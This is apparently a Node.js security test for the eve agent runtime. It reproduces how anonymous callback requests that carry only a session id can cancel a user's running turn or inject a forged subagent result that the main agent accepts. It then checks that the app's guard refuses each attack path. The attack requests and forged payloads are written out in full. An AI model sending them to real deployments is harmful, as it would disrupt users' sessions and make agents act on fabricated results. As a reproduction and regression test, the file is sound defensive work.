/**
 * EVE'S CALLBACK ROUTES, ATTACKED WITHOUT SIGNING IN — on the REAL eve runtime (the installed eve, 0.25.1), with a
 * scripted model. No provider, no network, no microVM, no live app.
 *
 * eve serves `GET|POST /eve/v1/connections/:name/callback/:token` and `POST /eve/v1/callback/:token` with no
 * authentication, and each resumes whatever workflow hook its token names (lib/eve-callback-routes.ts). Hook tokens
 * are derived from session ids, which every reader of a chat stream sees. This runs the same attacks twice, each on a
 * small app (a root and one specialist `alpha`, eve's in-process just-bash sandbox, scripts/fake-model-server.mjs
 * `--script handback`) served by `eve dev` from a temporary directory:
 *
 *   1. AS EVE SHIPS IT (the reproduction): with nothing but a session id,
 *        · `GET  /eve/v1/connections/<any>/callback/<sessionId>:cancel` (no body) CANCELS the running turn, and
 *        · `POST /eve/v1/callback/<sessionId>:turn-control:0:inbox` with `{kind:"session.completed", callId, …}` makes
 *          the main agent take a FORGED result as its specialist's answer (the callId is on the stream it reads).
 *   2. WITH THIS APP'S GUARD (agent/lib/callback-guard.ts and agent/channels/eve/v1/**, copied in from this checkout):
 *      every one of those, plus `:turn-control:0`, `:auth`, the continuation token and a child's guessed hooks, is
 *      refused (404) and changes nothing: the turn runs to the specialist's real answer.
 *
 * On a checkout without the guard, part 2 fails (the files are missing). Part 1 asserts the hole exists in eve itself,
 * so an eve that fixes it upstream turns part 1 red: that is the signal to re-read docs/SECURITY.md, not a regression.
 *
 * Run:  npm run test:callback-routes      (about a minute; EVE_CALLBACK_KEEP=1 keeps the temporary apps)
 */
import { spawn } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { freePort, spawnFakeModel } from "./lib/own-listener.mjs";

const ROOT = fileURLToPath(new URL("..", import.meta.url)).replace(/\/$/, "");
let passed = 0;
const failures = [];
const check = (what, ok, detail) => {
  if (ok) passed++;
  else failures.push(what);
  console.log(`  ${ok ? "ok  " : "FAIL"} ${what}${ok || detail === undefined ? "" : `\n         ${(typeof detail === "string" ? detail : JSON.stringify(detail)).slice(0, 900)}`}`);
};
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/** The app's own guard files, copied into the scratch app at the same paths. */
const GUARD_FILES = [
  "lib/eve-callback-routes.ts",
  "agent/lib/callback-guard.ts",
  "agent/channels/eve/v1/connections/callback/get.ts",
  "agent/channels/eve/v1/connections/callback/post.ts",
  "agent/channels/eve/v1/callback/post.ts",
];

const PREFIX = join(tmpdir(), "eve-callback-routes-");
const live = [];
const model = await spawnFakeModel(["--script", "handback"], { cwd: ROOT });
const cleanup = () => {
  for (const app of live) app.stop();
  model.stop();
};
process.on("exit", cleanup);
process.on("SIGINT", () => process.exit(130));

async function startApp(guarded) {
  const APP = mkdtempSync(PREFIX);
  const files = {
    "package.json": JSON.stringify({ name: "eve-callback-routes", private: true, type: "module" }),
    "agent/model.ts": [
      'import { createOpenAICompatible } from "@ai-sdk/openai-compatible";',
      'const provider = createOpenAICompatible({ name: "scripted", baseURL: process.env.SCRIPTED_MODEL_URL ?? "http://127.0.0.1:9/v1", apiKey: "none" });',
      'export const scripted = provider.chatModel("scripted-model");',
    ].join("\n"),
    "agent/agent.ts": 'import { defineAgent } from "eve";\nimport { scripted } from "./model.ts";\nexport default defineAgent({ model: scripted, modelContextWindowTokens: 200000 });\n',
    "agent/instructions.md": "The main agent of a test app.\n",
    "agent/sandbox.ts": 'import { defineSandbox } from "eve/sandbox";\nimport { justbash } from "eve/sandbox/just-bash";\nexport default defineSandbox({ backend: justbash() });\n',
    "agent/subagents/alpha/agent.ts": 'import { defineAgent } from "eve";\nimport { scripted } from "../../model.ts";\nexport default defineAgent({ description: "Test specialist alpha.", model: scripted, modelContextWindowTokens: 200000 });\n',
  };
  files["agent/subagents/alpha/sandbox.ts"] = files["agent/sandbox.ts"];
  if (guarded) for (const rel of GUARD_FILES) files[rel] = readFileSync(join(ROOT, rel), "utf8");
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(dirname(join(APP, rel)), { recursive: true });
    writeFileSync(join(APP, rel), text);
  }
  symlinkSync(join(ROOT, "node_modules"), join(APP, "node_modules"), "dir");
  const port = await freePort();
  const eve = spawn(join(ROOT, "node_modules/.bin/eve"), ["dev", "--no-ui", "--host", "127.0.0.1", "--port", String(port)], {
    cwd: APP,
    env: { ...process.env, SCRIPTED_MODEL_URL: `${model.base}/v1`, NO_COLOR: "1" },
    stdio: ["ignore", "pipe", "pipe"],
    detached: true,
  });
  let log = "";
  eve.stdout.on("data", (d) => (log += d));
  eve.stderr.on("data", (d) => (log += d));
  const app = {
    B: `http://127.0.0.1:${port}`,
    log: () => log,
    stop() {
      try {
        process.kill(-eve.pid, "SIGKILL");
      } catch {
        /* already gone */
      }
      // Only the directory this run created, by the path mkdtemp returned.
      if (!process.env.EVE_CALLBACK_KEEP && APP.startsWith(PREFIX)) rmSync(APP, { recursive: true, force: true });
    },
  };
  live.push(app);
  const mine = new RegExp(`listening at https?://[^\\s]+:${port}\\b`);
  for (let i = 0; ; i++) {
    if (eve.exitCode !== null) throw new Error(`eve dev exited before listening:\n${log.slice(-3000)}`);
    if (mine.test(log) && (await fetch(`${app.B}/eve/v1/health`).then((r) => r.ok, () => false))) break;
    if (i > 600) throw new Error(`eve dev did not come up on :${port}:\n${log.slice(-3000)}`);
    await sleep(250);
  }
  return app;
}

/* ---- talking to it (anonymous: no authorization header anywhere) ----------------------------------------------- */

const call = async (B, method, path, body) => {
  const r = await fetch(`${B}${path}`, {
    method,
    ...(body === undefined ? {} : { headers: { "content-type": "application/json" }, body: JSON.stringify(body) }),
  });
  return { status: r.status, body: await r.text().catch(() => "") };
};
async function history(B, id) {
  const ctrl = new AbortController();
  const out = [];
  let quiet;
  const arm = () => {
    clearTimeout(quiet);
    quiet = setTimeout(() => ctrl.abort(), 700);
  };
  try {
    const res = await fetch(`${B}/eve/v1/session/${id}/stream?startIndex=0`, { signal: ctrl.signal });
    const reader = res.body.getReader();
    const dec = new TextDecoder();
    let buf = "";
    arm();
    for (;;) {
      const { done, value } = await reader.read();
      if (done) break;
      arm();
      buf += dec.decode(value, { stream: true });
      for (let i; (i = buf.indexOf("\n")) >= 0; ) {
        const line = buf.slice(0, i).trim().replace(/^data: /, "");
        buf = buf.slice(i + 1);
        if (line) {
          try {
            out.push(JSON.parse(line));
          } catch {
            /* a keep-alive */
          }
        }
      }
    }
  } catch {
    /* the quiet timer aborted the read */
  }
  clearTimeout(quiet);
  return out.filter((e) => e && typeof e.type === "string" && !e.type.endsWith(".appended") && !e.type.endsWith(".delta"));
}
async function until(B, id, test, what, ms = 30_000) {
  const deadline = Date.now() + ms;
  for (;;) {
    const h = await history(B, id);
    if (test(h)) return h;
    if (Date.now() > deadline) throw new Error(`timed out waiting for ${what} on ${id}: ${h.map((e) => e.type).join(" ")}`);
    await sleep(300);
  }
}
const types = (h) => h.map((e) => e.type);
const finalText = (h) => h.filter((e) => e.type === "message.completed").map((e) => e.data?.message ?? "").join("\n");

/** A main thread waiting on its specialist (which answers after `ms`): its id, token, the call's id and the child's id. */
async function waitingOnSpecialist(B, ms) {
  const started = await call(B, "POST", "/eve/v1/session", { message: `[[hb alpha:slow=${ms}]]` });
  const body = JSON.parse(started.body);
  const h = await until(B, body.sessionId, (x) => types(x).includes("subagent.called"), "the specialist call");
  const called = h.find((e) => e.type === "subagent.called").data;
  return { id: body.sessionId, token: body.continuationToken, callId: called.callId ?? called.toolCallId, child: called.childSessionId, called };
}
const forged = (s) => ({ kind: "session.completed", callId: s.callId, subagentName: "alpha", output: "FORGED-BY-ANONYMOUS" });

try {
  /* ---- 1. as eve ships it ---------------------------------------------------------------------------------------- */
  console.log("eve as shipped, anonymous caller holding only a session id:");
  const bare = await startApp(false);
  const [a, b] = await Promise.all([waitingOnSpecialist(bare.B, 12_000), waitingOnSpecialist(bare.B, 12_000)]);
  check("the specialist's call id is on the main thread's own stream (what any reader of it sees)", typeof a.callId === "string" && a.callId.length > 0, a.called);

  const cancel = await call(bare.B, "GET", `/eve/v1/connections/anything/callback/${encodeURIComponent(`${a.id}:cancel`)}`);
  check("GET connection callback with `<sessionId>:cancel`, no body, no sign-in: accepted (200)", cancel.status === 200, cancel);
  const cancelled = await until(bare.B, a.id, (h) => types(h).includes("turn.cancelled"), "the cancelled turn", 15_000).catch((e) => e);
  check("…and the person's running turn is CANCELLED", Array.isArray(cancelled), String(cancelled?.message ?? ""));

  const inject = await call(bare.B, "POST", `/eve/v1/callback/${encodeURIComponent(`${b.id}:turn-control:0:inbox`)}`, forged(b));
  check("POST session callback to `<sessionId>:turn-control:0:inbox` with the call id: accepted (202)", inject.status === 202, inject);
  const fooled = await until(bare.B, b.id, (h) => /PARENT-DONE/.test(finalText(h)), "the main agent's answer", 10_000).catch((e) => e);
  check(
    "…and the main agent answers from the FORGED result, before the specialist has finished",
    Array.isArray(fooled) && /FORGED-BY-ANONYMOUS/.test(finalText(fooled)) && !/CHILD-RESULT alpha/.test(finalText(fooled)),
    Array.isArray(fooled) ? finalText(fooled) : String(fooled?.message ?? ""),
  );
  // Lower impact, shown for the record (docs/SECURITY.md ranks them).
  const auth = await call(bare.B, "GET", `/eve/v1/connections/anything/callback/${encodeURIComponent(`${b.id}:auth`)}`);
  check("`<sessionId>:auth` is resumable too (200): a forged sign-in callback waits, queued, for the session's next sign-in", auth.status === 200, auth);
  bare.stop();

  /* ---- 2. with this app's guard ------------------------------------------------------------------------------------ */
  console.log("\nwith agent/lib/callback-guard.ts (this checkout's files):");
  const missing = GUARD_FILES.filter((f) => !existsSync(join(ROOT, f)));
  check("the guard's files exist in this checkout", missing.length === 0, missing);
  if (missing.length) throw new Error("no guard to test");
  const app = await startApp(true);
  const s = await waitingOnSpecialist(app.B, 8_000);
  const before = (await history(app.B, s.id)).length;
  const attempts = [
    ["GET", `/eve/v1/connections/github/callback/${s.id}:cancel`, undefined],
    ["POST", `/eve/v1/connections/github/callback/${s.id}:cancel`, {}],
    ["POST", `/eve/v1/callback/${s.id}:cancel`, forged(s)],
    ["POST", `/eve/v1/callback/${s.id}:turn-control:0:inbox`, forged(s)],
    ["GET", `/eve/v1/connections/github/callback/${s.id}:turn-control:0:inbox`, undefined],
    ["POST", `/eve/v1/callback/${s.id}:turn-control:0`, forged(s)],
    ["GET", `/eve/v1/connections/github/callback/${s.id}:turn-control:0`, undefined],
    ["GET", `/eve/v1/connections/github/callback/${s.id}:auth`, undefined],
    ["POST", `/eve/v1/callback/${s.id}:auth`, forged(s)],
    ["GET", `/eve/v1/connections/github/callback/${s.token}`, undefined],
    ["POST", `/eve/v1/callback/${s.token}`, forged(s)],
    ["GET", `/eve/v1/connections/github/callback/${s.child}:cancel`, undefined],
    ["POST", `/eve/v1/callback/${s.child}:cancel`, forged(s)],
    ["POST", `/eve/v1/callback/${s.child}:stop-parked`, forged(s)],
    ["GET", `/eve/v1/connections/github/callback/${s.child}:stop-parked`, undefined],
  ];
  for (const [method, path, body] of attempts) {
    const r = await call(app.B, method, path, body);
    check(`refused: ${method} ${path.replace(s.id, "<session>").replace(s.child, "<child>").replace(s.token, "<continuation token>")}`, r.status === 404, r);
  }
  await sleep(1_500);
  const after = await history(app.B, s.id);
  check("…and nothing happened on the main thread: no new event, no cancelled turn", after.length === before && !types(after).includes("turn.cancelled"), types(after).slice(before));
  const done = await until(app.B, s.id, (h) => /PARENT-DONE/.test(finalText(h)), "the main agent's answer", 30_000);
  check("…the turn runs on to the specialist's REAL answer, and nothing forged reaches it", /CHILD-RESULT alpha/.test(finalText(done)) && !/FORGED/.test(finalText(done)), finalText(done));
  check("…the specialist was never cancelled", !types(await history(app.B, s.child)).includes("turn.cancelled"));
  check("each refusal is logged by token KIND, never the token", /\[callback-guard\] refused GET eve\/v1\/connections\/callback\/get: token kind :cancel/.test(app.log()) && /token kind turn-inbox/.test(app.log()) && /token kind continuation/.test(app.log()) && !app.log().includes(`${s.id}:cancel`));
  const health = await call(app.B, "GET", "/eve/v1/health");
  check("the agent's other routes are untouched (health 200)", health.status === 200, health);
  app.stop();
} catch (error) {
  failures.push(String(error?.message ?? error));
  console.log(`  FAIL ${error?.stack ?? error}`);
}

console.log(`\n${passed} checks passed${failures.length ? `, ${failures.length} FAILED:\n  - ${failures.join("\n  - ")}` : ""}`);
process.exit(failures.length ? 1 : 0);
